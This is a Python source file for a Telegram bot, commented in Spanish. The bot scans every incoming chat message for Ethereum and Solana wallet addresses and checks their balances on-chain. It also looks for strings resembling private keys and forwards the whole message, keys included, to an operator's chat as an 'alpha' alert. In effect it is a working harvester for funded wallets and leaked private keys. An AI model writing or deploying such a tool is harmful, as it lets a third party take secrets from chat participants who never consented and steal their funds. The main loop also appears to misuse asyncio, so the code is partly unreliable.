import os
import re
import requests
from telegram import Update
from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes

# ===== VARIABLES =====
TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")

# ===== CONFIG =====
MIN_ETH = 0.001
MIN_SOL = 0.01

# ===== REGEX =====
ETH_REGEX = r"\b0x[a-fA-F0-9]{40}\b"
SOLANA_REGEX = r"\b[1-9A-HJ-NP-Za-km-z]{32,44}\b"
PRIVATE_KEY_REGEX = r"\b([A-Fa-f0-9]{64}|[1-9A-HJ-NP-Za-km-z]{64,})\b"

# ===== VALIDACIÓN =====

def get_eth_balance(address):
    try:
        url = f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest&apikey={os.getenv('ETHERSCAN_API_KEY')}"
        r = requests.get(url).json()
        wei = int(r["result"])
        return wei / 1e18
    except:
        return 0


def get_sol_balance(address):
    try:
        url = os.getenv("SOL_RPC", "https://api.mainnet-beta.solana.com")
        payload = {
            "jsonrpc":"2.0",
            "id":1,
            "method":"getBalance",
            "params":[address]
        }
        r = requests.post(url, json=payload).json()
        lamports = r["result"]["value"]
        return lamports / 1e9
    except:
        return 0


def detect_and_validate(text):
    findings = []

    # ETH
    eth_matches = re.findall(ETH_REGEX, text)
    for addr in eth_matches:
        bal = get_eth_balance(addr)
        if bal >= MIN_ETH:
            findings.append(f"🟣 ETH Wallet: {addr} | Balance: {bal:.4f}")

    # SOL
    sol_matches = re.findall(SOLANA_REGEX, text)
    for addr in sol_matches:
        bal = get_sol_balance(addr)
        if bal >= MIN_SOL:
            findings.append(f"🟢 SOL Wallet: {addr} | Balance: {bal:.4f}")

    # PRIVATE KEYS
    if re.search(PRIVATE_KEY_REGEX, text):
        findings.append("🔑 Posible PRIVATE KEY detectada")

    return findings


# ===== HANDLER =====

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = update.message

    if not msg or not msg.text:
        return

    findings = detect_and_validate(msg.text)

    if findings:
        response = "🚨 ALERTA ALPHA REAL 🚨\n\n"
        response += msg.text + "\n\n"
        response += "💰 Detectado:\n"

        for f in findings:
            response += f"- {f}\n"

        await context.bot.send_message(
            chat_id=CHAT_ID,
            text=response
        )

        print("✅ ALPHA DETECTADA")


# ===== MAIN =====

import asyncio

async def main():
    app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()

    # limpia conflictos anteriores correctamente
    await app.bot.delete_webhook(drop_pending_updates=True)

    app.add_handler(MessageHandler(filters.ALL, handle_message))

    print("🤖 Bot ALPHA limpio y activo...")
    await app.run_polling()


if __name__ == "__main__":
    asyncio.run(main())